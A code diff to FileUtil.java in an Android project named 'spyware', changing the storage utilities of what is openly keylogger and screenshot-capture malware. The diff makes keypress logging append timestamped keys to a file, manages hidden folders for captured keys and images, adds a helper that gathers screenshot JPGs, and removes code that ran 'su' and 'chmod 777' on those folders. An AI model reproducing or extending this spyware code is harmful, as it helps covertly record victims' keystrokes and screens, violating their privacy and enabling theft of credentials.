@@ -1,5 +1,6 @@
 package com.example.cristianturetta.spyware;
 
+import android.content.pm.PackageManager;
 import android.graphics.Bitmap;
 import android.os.Build;
 import android.os.Environment;
@@ -18,9 +19,11 @@ import java.io.InputStreamReader;
 import java.io.OutputStream;
 import java.text.DateFormat;
 import java.text.SimpleDateFormat;
+import java.util.ArrayList;
 import java.util.Calendar;
 import java.util.Date;
 import java.util.Locale;
+import java.util.Random;
 
 public class FileUtil {
 
@@ -31,57 +34,30 @@ public class FileUtil {
     private static FileUtil mInstance;
 
     private FileUtil() {
+
+
         malwareKeypressStorageFolder = new File(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOCUMENTS),
                 "keys");
         malwareImagesStorageFolder = new File(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DCIM),
                 "imgs");
 
-        if(malwareImagesStorageFolder.exists()){
-            try {
-                Process process = Runtime.getRuntime().exec("su");
-                DataOutputStream os = new DataOutputStream(process.getOutputStream());
-                os.writeBytes("chmod 777 " + malwareKeypressStorageFolder.getAbsolutePath());
-                os.flush();
-                os.close();
-                process.waitFor();
-            } catch (IOException e) {
-                e.printStackTrace();
-            } catch (InterruptedException e) {
-                e.printStackTrace();
-            }
 
-        }else{
-            if(FileUtil.isExternalStorageWritable())
+
+        if(!malwareKeypressStorageFolder.exists())
+            if (FileUtil.isExternalStorageWritable())
                 if (!malwareKeypressStorageFolder.mkdirs()) {
                     Log.e("FileUtil", "Key directory not created");
                 }
-        }
 
-        if(malwareImagesStorageFolder.exists()){
-            try {
-                Process process = Runtime.getRuntime().exec("su");
-                DataOutputStream os = new DataOutputStream(process.getOutputStream());
-                os.writeBytes("chmod 777 " + malwareImagesStorageFolder.getAbsolutePath());
-                os.flush();
-                os.close();
-                process.waitFor();
-            } catch (IOException e) {
-                e.printStackTrace();
-            } catch (InterruptedException e) {
-                e.printStackTrace();
-            }
-
-        }else {
-            if(FileUtil.isExternalStorageWritable())
+        if(!malwareImagesStorageFolder.exists())
+            if (FileUtil.isExternalStorageWritable())
                 if (!malwareImagesStorageFolder.mkdirs()) {
                     Log.e("FileUtil", "Key directory not created");
                 }
 
-        }
-
-
 
     }
+
 
     public static FileUtil getInstance() {
         if (mInstance == null) {
@@ -95,7 +71,6 @@ public class FileUtil {
     }
 
 
-
     private static boolean isExternalStorageWritable() {
         String state = Environment.getExternalStorageState();
         if (Environment.MEDIA_MOUNTED.equals(state)) {
@@ -103,6 +78,8 @@ public class FileUtil {
         }
         return false;
     }
+
+
 
 
     public String getMalwareKeypressStorageFolder() {
@@ -116,7 +93,6 @@ public class FileUtil {
     public String getKeypressFileName() {
         return keypressFileName;
     }
-
 
 
     /**
@@ -145,7 +121,7 @@ public class FileUtil {
      *
      * @param key the keypress to store
      */
-    public void storeKeypress(String key){
+    public void storeKeypress(String key) {
 
         DateFormat df = new SimpleDateFormat("dd/MM/yyyy-HH:mm:ss z :", Locale.ITALIAN);
         String time = df.format(Calendar.getInstance().getTime());
@@ -157,7 +133,7 @@ public class FileUtil {
         String toWrite = time + key;
 
         try {
-            writer = new FileWriter(keypressFile);
+            writer = new FileWriter(keypressFile, true);
             writer.append(toWrite);
             writer.flush();
             writer.close();
@@ -166,10 +142,9 @@ public class FileUtil {
         }
 
 
-
     }
 
-    public void deleteKeypressFile(){
+    public void deleteKeypressFile() {
         File keypressFile = new File(malwareKeypressStorageFolder, keypressFileName);
         keypressFile.delete();
     }
@@ -185,7 +160,7 @@ public class FileUtil {
         return sb.toString();
     }
 
-    public static String getStringFromFile (String filePath) throws Exception {
+    public static String getStringFromFile(String filePath) throws Exception {
         try {
             File fl = new File(filePath);
             FileInputStream fin = new FileInputStream(fl);
@@ -197,5 +172,21 @@ public class FileUtil {
             e.printStackTrace();
         }
         return null;
+    }
+
+    /**
+     * Gives an {@link ArrayList<File>} of JPG images.
+     *
+     * @param path The {@link File} of the directory containing screenshots
+     */
+    public ArrayList<File> getAllImagesFrom(File path) {
+        File[] allFiles = path.listFiles();
+        ArrayList<File> allImages = new ArrayList<>();
+        for (File file : allFiles) {
+            if (file.getName().endsWith(".jpg")) {
+                allImages.add(file);
+            }
+        }
+        return allImages;
     }
 }
